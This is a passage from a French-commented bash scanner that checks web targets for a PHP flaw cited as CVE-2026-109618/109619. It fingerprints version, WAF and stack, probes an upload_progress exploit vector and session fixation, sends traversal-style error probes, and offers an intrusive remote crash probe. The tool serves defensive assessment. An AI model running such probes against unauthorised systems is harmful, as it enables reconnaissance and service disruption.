  exit "$RC"
fi

###############################################################################
# MODE WEB — boîte noire sur URL
###############################################################################
command -v curl >/dev/null 2>&1 || { echo "curl requis pour le mode web." >&2; exit 69; }
banner "$URL"
# UA navigateur : sans ça, les CDN/WAF (Cloudflare bot-management…) servent une
# page dégradée et masquent le contenu. Surchargeable via GALEAX_UA.
UA="${GALEAX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36}"
CURLH=(curl -sS -k --compressed -A "$UA" "${HDR_ARGS[@]+"${HDR_ARGS[@]}"}")   # options communes (+ en-têtes custom)
BASEURL="$(printf '%s' "$URL" | sed -E 's#(https?://[^/]+).*#\1#')"
extract_ver(){ printf '%s' "$1" | grep -ioE '(PHP/|PHP Version )[0-9]+\.[0-9]+\.[0-9]+' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | awk '!s[$0]++'; }

HDRS="$("${CURLH[@]}" -D - -o /dev/null --max-time 15 "$URL" 2>/dev/null || true)"
MAINBLOB="$("${CURLH[@]}" -L -D - --max-time 15 "$URL" 2>/dev/null || true)"

# Cible injoignable (DNS / TLS / timeout / filtrage).
if [[ -z "$HDRS" && -z "$MAINBLOB" ]]; then
  diag="$("${CURLH[@]}" -o /dev/null -w '%{http_code}' --max-time 15 "$URL" 2>&1 | tr -d '\n' | head -c 120)"
  MODE=web; VER=""; VERDICT="INJOIGNABLE"; CONF="-"; RC=3
  REASON="aucune réponse HTTP (DNS, TLS, timeout ou filtrage). Détail: ${diag:-n/a}"
  [[ "$JSON" -eq 1 ]] && { emit_json ',"reachable":false'; exit "$RC"; }
  say "${BLD}[!] Connectivité${RST}"; line "cible" "injoignable — $REASON"
  verdict_box; exit "$RC"
fi

# Version : toutes les occurrences vues (en-têtes de tous les hops + corps),
# on retient la plus basse (la plus à risque) et on signale un éventuel conflit.
VER_ALL="$(extract_ver "$HDRS
$MAINBLOB" | tr '\n' ' ' | sed 's/ *$//')"
VER_CONFLICT=0; [[ "$(printf '%s' "$VER_ALL" | wc -w)" -gt 1 ]] && VER_CONFLICT=1
VER="$(printf '%s' "$VER_ALL" | tr ' ' '\n' | grep . | sort -t. -k1,1n -k2,2n -k3,3n | head -1 || true)"
[[ -n "$VERSPEC" ]] && { VER="$VERSPEC"; VER_ALL="$VERSPEC"; VER_CONFLICT=0; }
SRV="$(printf '%s' "$HDRS" | grep -iE '^Server:'       | head -1 | tr -d '\r' | sed 's/^[Ss]erver: *//' || true)"
XPB="$(printf '%s' "$HDRS" | grep -iE '^X-Powered-By:' | head -1 | tr -d '\r' | sed 's/^[Xx]-[Pp]owered-[Bb]y: *//' || true)"
# Distribution : uniquement depuis Server/X-Powered-By (pas le corps -> faux positifs).
DISTRO="$(printf '%s' "$SRV $XPB" | grep -ioE 'Debian|Ubuntu|Red Hat|CentOS|Rocky|AlmaLinux|SUSE|Alpine|FreeBSD' | head -1 || true)"

# Récupération renforcée (--deep) si la version est masquée sur l'URL.
if [[ -z "$VER" && "$RECOVER" -eq 1 ]]; then
  say "${BLD}[0] Récupération de version (multi-chemins / multi-méthodes)${RST}"
  for path in "/" "/index.php" "/index.html" "/phpinfo.php" "/info.php" "/php_info.php" \
              "/test.php" "/i.php" "/php.php" "/status" "/server-status" "/.noexist-$RANDOM.php"; do
    for m in GET HEAD; do
      [[ "$m" == HEAD ]] && blob="$("${CURLH[@]}" -I --max-time 10 "${BASEURL}${path}" 2>/dev/null || true)" \
                         || blob="$("${CURLH[@]}" -D - --max-time 10 "${BASEURL}${path}" 2>/dev/null || true)"
      v="$(extract_ver "$blob" | head -1)"
      [[ -n "$v" ]] && { VER="$v"; line "trouvé" "PHP $v via $m ${path}"; break 2; }
    done
  done
  # Leak par page d'erreur (méthode inconnue / URI malformée -> 4xx/5xx).
  if [[ -z "$VER" ]]; then
    blob="$("${CURLH[@]}" -D - --max-time 10 -X GALEAXPROBE "${BASEURL}/" 2>/dev/null || true)
$("${CURLH[@]}" -D - --max-time 10 "${BASEURL}/%2e%2e%2f%2e%2e%2f%2e%2e" 2>/dev/null || true)"
    v="$(extract_ver "$blob" | head -1)"
    [[ -n "$v" ]] && { VER="$v"; line "trouvé" "PHP $v via page d'erreur"; }
  fi
  [[ -z "$VER" ]] && line "résultat" "${YEL}version non récupérée${RST} — tenter --phpinfo <url> ou le test local"
  say ""
fi

# Détection : présence PHP (en-têtes/cookies/hébergeur), WAF, challenge, stack.
nf="$("${CURLH[@]}" -L --max-time 12 "${BASEURL}/galeax-probe-$RANDOM-404" 2>/dev/null || true)"
sig="$HDRS
$MAINBLOB
$nf"
PHP_SIG=""; WAF=""; STACK=""
php_hit(){ printf '%s' "$sig" | grep -qiE "$1"; }
php_hit 'X-Powered-By:[[:space:]]*PHP|PHP Version|PHP/[0-9]'          && PHP_SIG="$PHP_SIG en-tête-PHP"
php_hit 'Set-Cookie:[^\r\n]*PHPSESSID='                              && PHP_SIG="$PHP_SIG PHPSESSID"
php_hit 'Set-Cookie:[^\r\n]*(laravel_session|XSRF-TOKEN)='           && PHP_SIG="$PHP_SIG Laravel"
php_hit 'Set-Cookie:[^\r\n]*ci_session='                             && PHP_SIG="$PHP_SIG CodeIgniter"
php_hit 'Set-Cookie:[^\r\n]*(CAKEPHP|symfony)='                      && PHP_SIG="$PHP_SIG Symfony/CakePHP"
php_hit 'x-kinsta-cache|x-wpe[-a-z]|X-Powered-By:[[:space:]]*WP Engine|x-pantheon' && PHP_SIG="$PHP_SIG hébergeur-PHP"
PHP_SIG="$(printf '%s' "$PHP_SIG" | tr ' ' '\n' | awk 'NF&&!s[$0]++' | tr '\n' ' ' | sed 's/ *$//')"

if   printf '%s' "$sig" | grep -qiE 'Server:[[:space:]]*cloudflare|^cf-ray:|cf-cache-status'; then WAF="Cloudflare"
elif printf '%s' "$sig" | grep -qiE 'X-Sucuri-ID|X-Sucuri-Cache'; then WAF="Sucuri"
elif printf '%s' "$sig" | grep -qiE 'AkamaiGHost|X-Akamai'; then WAF="Akamai"
elif printf '%s' "$sig" | grep -qiE 'X-Iinfo|Incapsula|X-CDN:[[:space:]]*Imperva'; then WAF="Imperva/Incapsula"
elif printf '%s' "$sig" | grep -qiE 'X-Amz-Cf-Id|Via:[^\r\n]*cloudfront'; then WAF="AWS CloudFront"
elif printf '%s' "$sig" | grep -qiE 'Set-Cookie:[^\r\n]*BIGipServer'; then WAF="F5 BIG-IP"
elif printf '%s' "$sig" | grep -qiE 'Mod_Security|openresty'; then WAF="ModSecurity/OpenResty"
fi

CHALLENGE=0
if printf '%s' "$sig" | grep -qiE 'Just a moment\.\.\.|Checking your browser|Attention Required! \| Cloudflare|cf-chl|challenge-platform|_Incapsula_Resource|px-captcha|/cdn-cgi/challenge'; then
  CHALLENGE=1; [[ -z "$WAF" ]] && WAF="challenge anti-bot"
fi

if   [[ -n "$PHP_SIG" ]]; then STACK="PHP"
elif printf '%s' "$sig" | grep -qiE 'Werkzeug|If you entered the URL manually please check your spelling'; then STACK="Python/Flask (Werkzeug)"
elif printf '%s' "$sig" | grep -qiE 'Server:[[:space:]]*uvicorn|\{"detail":"Not Found"\}'; then STACK="Python/FastAPI (uvicorn)"
elif printf '%s' "$sig" | grep -qiE 'gunicorn|csrftoken|Set-Cookie:[^\r\n]*sessionid='; then STACK="Python/Django"
elif printf '%s' "$sig" | grep -qiE 'X-Powered-By:[[:space:]]*Express|^[[:space:]]*Cannot (GET|POST) '; then STACK="Node.js/Express"
elif printf '%s' "$sig" | grep -qiE 'X-Powered-By:[[:space:]]*ASP\.NET|X-AspNet(Mvc)?-Version|__VIEWSTATE'; then STACK="ASP.NET"
elif printf '%s' "$sig" | grep -qiE 'X-Runtime|Phusion Passenger|action_dispatch'; then STACK="Ruby/Rails"
elif printf '%s' "$sig" | grep -qiE 'Set-Cookie:[^\r\n]*JSESSIONID=|Apache Tomcat|Whitelabel Error Page'; then STACK="Java (Spring/Tomcat)"
elif printf '%s' "$nf"  | grep -qxiE '404 page not found'; then STACK="Go (net/http)"
fi

compute_verdict "$VER"
if [[ -z "$VER" && -n "$STACK" && "$STACK" != "PHP" ]]; then
  VERDICT="HORS PÉRIMÈTRE (cible non-PHP)"; CONF="élevée"; RC=0
  REASON="stack détecté : $STACK — php2shell ne concerne que PHP"
elif [[ -z "$VER" && "$STACK" == "PHP" ]]; then
  VERDICT="PHP CONFIRMÉ — version masquée"; CONF="moyenne"; RC=3
  REASON="PHP détecté ($PHP_SIG) mais version non exposée → trancher avec 'local'"
fi

say "${BLD}[1] Version PHP${RST}"
[[ -n "$STACK" ]] && line "stack" "$STACK$( [[ "$STACK" == PHP ]] && printf " (signaux : $PHP_SIG)" || printf ' (pas de PHP ici)')"
[[ -n "$WAF" ]] && line "WAF/CDN" "$WAF ${DIM}(peut masquer la version ; l'origine peut différer)${RST}"
[[ "$CHALLENGE" -eq 1 ]] && line "" "${YEL}challenge anti-bot${RST} → contenu réel masqué, détection partielle"
if [[ -n "$VER" ]]; then line "version" "PHP $VER  ($REASON)"
else line "version" "${YEL}non divulguée${RST} — expose_php=Off / proxy"; fi
[[ -n "$XPB" ]] && line "X-Powered-By" "$XPB"
[[ -n "$DISTRO" ]] && line "build" "$DISTRO"
[[ "$VER_CONFLICT" -eq 1 ]] && line "candidats" "${YEL}versions divergentes${RST} : $VER_ALL (on retient la plus basse)"

say ""; say "${BLD}[2] SAPI & exposition du vecteur${RST}"
[[ -n "$SRV" ]] && line "Server" "$SRV"
if printf '%s' "$HDRS" | grep -iqE 'mod_php|Apache'; then
  SAPI_RISK="élevé"; line "SAPI" "Apache/mod_php probable → worker survit à l'OOM = ${RED}vecteur exploitable${RST}"
else SAPI_RISK="inconnu"; line "SAPI" "non confirmé (FPM = worker sort à l'OOM → chaîne de ce vecteur inopérante)"; fi

say ""; say "${BLD}[3] Posture de mitigation${RST}"
# Le vecteur réel (poc/ref-exploit) : livraison du sérialisé piégé par
# session.upload_progress en multipart (champs PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS),
# sur Apache mod_php (en FPM le worker sort à l'OOM → chaîne inopérante). On sonde ce
# canal avec un marqueur BÉNIN (aucune charge OOM) : seul son acceptation nous intéresse.
MITIG_EVID=0; UP_VECT="non sondé"; BODY_LIMIT="non sondé"; SESS_FIX="non sondé"
if [[ "$ACTIVE" -eq 1 ]]; then
  BND="----galeaxprobe${RANDOM}${RANDOM}"; SID="galeax${RANDOM}${RANDOM}probe"
  mp="$(printf -- '--%s\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n--%s\r\nContent-Disposition: form-data; name="f"; filename="p.txt"\r\nContent-Type: application/octet-stream\r\n\r\nGALEAXPROBE\r\n--%s--\r\n' "$BND" "$SID" "$BND" "$BND" "$BND")"
  resp="$(printf '%s' "$mp" | curl -sS -k -D - -o /dev/null -w $'\n%{http_code}' --max-time 20 \
          -X POST -H "Content-Type: multipart/form-data; boundary=$BND" \
          -b "PHPSESSID=$SID" --data-binary @- "$URL" 2>/dev/null || printf '\n000')"
  code="$(printf '%s' "$resp" | tail -1 | tr -dc '0-9')"; code="${code:-000}"
  sc="$(printf '%s' "$resp" | grep -iqE '^Set-Cookie:[^\r\n]*PHPSESSID=' && echo oui || echo non)"
  line "vecteur upload_progress" "POST multipart → HTTP $code"
  case "$code" in
    2*|3*)        UP_VECT="ouvert"; line "" "${RED}vecteur accepté${RST}$([[ "$sc" == oui ]] && printf ' (session PHP engagée)')" ;;
    413)          UP_VECT="corps refusé"; MITIG_EVID=1; line "" "${GRN}413${RST} → corps refusé → livraison du sérialisé gênée" ;;
    403|406|501)  UP_VECT="filtré";     MITIG_EVID=1; line "" "${GRN}refus $code${RST} → vecteur filtré (WAF/politique)" ;;
    405)          UP_VECT="POST interdit"; line "" "${YEL}405${RST} → POST non admis ici (essayer un endpoint POST réel)" ;;
    000)          UP_VECT="injoignable"; line "" "${YEL}pas de réponse${RST}" ;;
    *)            UP_VECT="indéterminé"; line "" "réponse $code (ni acceptation nette ni refus)" ;;
  esac
  # Corroboration : le sous-système de session est-il actif et un id choisi est-il
  # honoré ? L'exploit épingle un PHPSESSID connu pour retrouver sess_<id> écrit par
  # upload_progress. GET bénins, aucune charge. use_strict_mode ne bloque pas (l'id
  # assigné reste connu de l'attaquant) → informatif, pas une mitigation.
  SESS_FIX="non confirmé"
  g0="$("${CURLH[@]}" -D - -o /dev/null --max-time 12 "$URL" 2>/dev/null || true)"
  g1="$("${CURLH[@]}" -D - -o /dev/null --max-time 12 -b "PHPSESSID=$SID" "$URL" 2>/dev/null || true)"
  sess_app="$(printf '%s' "$g0" | grep -iqE '^Set-Cookie:[^\r\n]*PHPSESSID=' && echo oui || echo non)"
  new_id="$(printf '%s' "$g1" | grep -ioE '^Set-Cookie:[^\r\n]*PHPSESSID=[^;[:space:]]+' | head -1 | sed -E 's/.*PHPSESSID=//')"
  if   [[ "$sess_app" == non && -z "$new_id" ]]; then
    SESS_FIX="sessions non vues"; line "session" "${DIM}aucune session PHP sur cette URL (endpoint sans session ?)${RST}"
  elif [[ -n "$new_id" && "$new_id" != "$SID" ]]; then
    SESS_FIX="id régénéré (strict)"; line "session" "id supplié régénéré ${DIM}(use_strict_mode ; l'attaquant utilise l'id assigné)${RST}"
  else
    SESS_FIX="id honoré (fixation)"; line "session" "${RED}id supplié honoré${RST} → fixation possible (sess_<id> localisable)"
  fi
  # Affine la confiance du vecteur selon la corroboration session.
  if [[ "$UP_VECT" == ouvert ]]; then
    case "$SESS_FIX" in
      "id honoré"*)     UP_VECT="ouvert (confirmé)" ;;
      "id régénéré"*)   UP_VECT="ouvert" ;;
      *)                UP_VECT="ouvert (non confirmé)" ;;
    esac
  fi
  # Taille : le sérialisé piégé pèse plusieurs Mo ; une borne basse gêne sa livraison.
  probe_body(){ head -c "$1" /dev/zero | tr '\0' A \
     | curl -sS -k -o /dev/null -w '%{http_code}' --max-time 20 -X POST \
            -H 'Content-Type: application/octet-stream' --data-binary @- "$URL" 2>/dev/null || echo 000; }
  c2="$(probe_body $((2*1024*1024)))"; c8="$(probe_body $((8*1024*1024)))"
  line "limite de corps" "2 Mo → HTTP $c2 | 8 Mo → HTTP $c8 ${DIM}(borne frontale : nginx/Apache)${RST}"
  if   [[ "$c2" =~ ^41 ]]; then MITIG_EVID=1; BODY_LIMIT="<2M"; line "" "${GRN}borne < 2 Mo${RST} → sérialisé difficilement livrable"
  elif [[ "$c8" =~ ^41 ]]; then BODY_LIMIT="<8M"; line "" "borne vers 2–8 Mo (livraison contrainte)"
  else BODY_LIMIT="≥8M"; line "" "pas de borne frontale ${DIM}(post_max_size PHP reste invisible en boîte noire : renvoie 200)${RST}"; fi
else line "sonde" "${DIM}non lancée (--active)${RST}"; fi

if [[ -n "$PHPINFO" ]]; then
  PI="$("${CURLH[@]}" --max-time 20 "$PHPINFO" 2>/dev/null || true)"
  if [[ -n "$PI" ]]; then
    PIVER="$(printf '%s' "$PI" | grep -oiE 'PHP Version [0-9]+\.[0-9]+\.[0-9]+' | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' || true)"
    [[ -n "$PIVER" ]] && { line "version" "PHP $PIVER (phpinfo, autoritatif)"; [[ -z "$VER" ]] && { VER="$PIVER"; compute_verdict "$VER"; }; }
    pival(){ printf '%s' "$PI" | grep -ioE "$1[^<]*</td><td[^>]*>[^<]*" | head -1 | sed -E 's/.*<td[^>]*>//; s/[[:space:]]+$//'; }
    for d in memory_limit post_max_size session.upload_progress.enabled allow_url_include fatal_error_backtraces; do
      line "$d" "$(pival "$d")"; done
    [[ "$(pival memory_limit)" == "-1" ]] && { MITIG_EVID=1; line "" "${GRN}memory_limit=-1${RST} → OOM non armable (si non-overridable)"; }
  else line "phpinfo" "${YEL}inaccessible/vide${RST} : $PHPINFO"; fi
else line "phpinfo" "${DIM}non fourni (--phpinfo <url>)${RST}"; fi

# -------------------------------------------------------------- [5] Sonde de crash
# Déclenchement réel du bug : seule façon de PROUVER la vulnérabilité à distance
# (indépendamment de la version, utile si elle est masquée ou rétroportée). INTRUSIF.
CRASH_RESULT="non lancée"; CRASH_MODE=""; CRASH_PROVEN=0
if [[ "$CRASH" -eq 1 ]]; then
  say ""; say "${BLD}[5] Sonde de crash active ${RED}(intrusive)${RST}"
  # Cibles : --path explicites, sinon le chemin de l'URL s'il est spécifique, sinon /index.php.
  declare -a CRASH_TARGETS=()
  if [[ ${#PATHS[@]} -gt 0 ]]; then for p in "${PATHS[@]}"; do CRASH_TARGETS+=("$BASEURL$p"); done
  else
    upath="$(printf '%s' "$URL" | sed -E 's#^https?://[^/]+##')"
    if [[ -n "$upath" && "$upath" != "/" ]]; then CRASH_TARGETS+=("$URL"); else CRASH_TARGETS+=("$BASEURL/index.php"); fi
  fi
  line "paramètres" "SAPI=$SAPIARG · corps 1→8→20 Mio · clés imbriquées $NESTED_KEYS · timeout ${TIMEOUT}s"
  for t in "${CRASH_TARGETS[@]}"; do
    crash_detect "$t"
    case "$CRASH_RESULT" in
      vulnerable)  line "$t" "${RED}CRASH PROUVÉ${RST} ($CRASH_MODE) — $CRASH_REASON"; CRASH_PROVEN=1; break ;;
      inconclusive) line "$t" "${YEL}indéterminé${RST} — $CRASH_REASON" ;;
      error)       line "$t" "${YEL}erreur${RST} — $CRASH_REASON" ;;
      *)           line "$t" "${DIM}aucun signal de crash (HTTP ${CRASH_STATUS:-?})${RST}" ;;
    esac
  done
  if [[ "$CRASH_PROVEN" -eq 1 ]]; then
    VERDICT="VULNÉRABLE"; CONF="certaine (crash prouvé à distance)"; RC=1
    REASON="crash déclenché à distance ($CRASH_MODE) : $CRASH_REASON"
  fi
else line "sonde crash" "${DIM}non lancée (--crash ; intrusif)${RST}"; fi

# Rétroportage distro : une version < correctif sur un build Debian/RHEL peut être
# déjà patchée (n° figé) -> on nuance et on renvoie vers 'local'.
BACKPORT=0
if [[ "$RC" -eq 1 && "$REASON" == *"(correctif)"* ]] \
   && printf '%s' "$DISTRO $SRV" | grep -qiE 'Debian|Ubuntu|Red Hat|CentOS|Rocky|Alma|SUSE'; then
  CONF="moyenne"; BACKPORT=1
  REASON="$REASON ; build ${DISTRO:-distro} → rétroportage possible, confirmer en 'local'"
fi
# Un crash prouvé prime : il démontre l'exploitabilité malgré d'éventuelles mitigations.
[[ "$RC" -eq 1 && "$MITIG_EVID" -eq 1 && "$CRASH_PROVEN" -eq 0 ]] && { VERDICT="EXPOSITION RÉDUITE (vulnérable mais mitigé)"; RC=2; }

if [[ "$JSON" -eq 1 ]]; then
  MODE=web
  emit_json ',"server":"'"$(printf '%s' "$SRV"|sed 's/"/\\"/g')"'","sapi_risk":"'"$SAPI_RISK"'","stack":"'"$STACK"'","waf":"'"$WAF"'","challenge":'"$CHALLENGE"',"php_signals":"'"$PHP_SIG"'","distro":"'"$DISTRO"'","versions_seen":"'"$VER_ALL"'","upload_progress_vector":"'"$UP_VECT"'","session_fixation":"'"$SESS_FIX"'","body_limit":"'"$BODY_LIMIT"'","mitigation_evidence":'"$MITIG_EVID"',"backport_possible":'"$BACKPORT"',"crash_probe":"'"$(printf '%s' "$CRASH_RESULT"|sed 's/"/\\"/g')"'","crash_proven":'"$CRASH_PROVEN"',"crash_mode":"'"$(printf '%s' "$CRASH_MODE"|sed 's/"/\\"/g')"'"'
  exit "$RC"
fi
verdict_box
if [[ -z "$VER" && -n "$STACK" && "$STACK" != "PHP" ]]; then
  say ""; say "  La cible ne sert pas de PHP sur cette URL — CVE-2026-109618/109619 non applicable."
elif [[ -z "$VER" ]]; then
  say ""; say "  ${YEL}Version non divulguée${RST} → confirmer via --deep, --phpinfo <url>, ou le test ${BLD}local${RST}."
fi
exit "$RC"
